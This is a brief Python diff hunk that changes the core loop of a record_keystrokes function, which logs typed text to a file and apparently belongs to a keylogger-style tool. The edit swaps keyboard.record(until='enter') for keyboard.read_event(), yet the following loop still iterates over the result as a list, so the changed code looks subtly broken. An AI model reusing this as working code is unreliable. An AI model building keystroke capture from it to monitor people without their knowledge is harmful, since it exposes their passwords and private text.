@@ -339,7 +339,7 @@ def record_keystrokes():
         with open(keystroke_file_path, 'a') as data_file:
             data_file.write(f"Started recording at {time.ctime()}\\n")
             while is_recording:
-                events = keyboard.record(until='enter')  # Enregistrer jusqu'a "enter"
+                events = keyboard.read_event() 
                 typed_text = ""
 
                 for event in events:
